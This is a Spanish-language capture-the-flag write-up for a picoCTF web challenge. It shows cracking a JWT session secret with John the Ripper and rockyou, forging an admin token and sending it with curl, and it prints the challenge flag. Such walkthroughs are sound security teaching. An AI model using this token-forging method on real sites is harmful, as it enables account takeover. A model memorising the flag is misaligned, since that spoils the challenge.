
## DESCRIPCIÓN
Check the admin scratchpad!

http://fickle-tempest.picoctf.net:54965
## SOLUCIÓN
Entramos a la pagina e intentamos loguearnos con cualquier usuario, una vez adentro nos genera un token de entrada, lo capturamos ya sea desde el Network del codigo fuente o con el plugin de Cookie-Editor, para decifrarlo lo guardamos en un archivo:

```
nano token

[CONTENIDO DEL TOKEN]
```

una vez guardado, descomprimimos un archivo que contiene un diccionario con muchas palabras para decifrar el token:

```
gizip -d /usr/share/wordlists/rockyou.txt.gz
```

despues utilizamos la herramienta de john the ripper para que busque palabra por palabra hasta encontrar la palabra clave:

```
john token -w=/usr/share/wordlists/rockyou.txt
```

encontramos la palabra clave:

ilovepico

despues nos vamos a una pagina como jwt lannysport y cambiamos los valores del payload (el nombre del usuario) lo cambiamos por admin, y colocamos la palabra clave abajo de ilovepico y generamos el token ya modificado. Una vez generado lo modificamos con el siguiente comando:

```
curl http://fickle-tempest.picoctf.net:64711/  -H "Cookie: jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.gtqDl4jVDvNbEe_JYEZTN19Vx6X9NNZtRVbKPBkhO-s" | grep picoCTF
```

y obtenemos la flag:

picoCTF{jawt_was_just_what_you_thought_bbb82bd4a57564aefb32d69dafb60583}
## NOTAS ADICIONALES

## REFERENCIAS





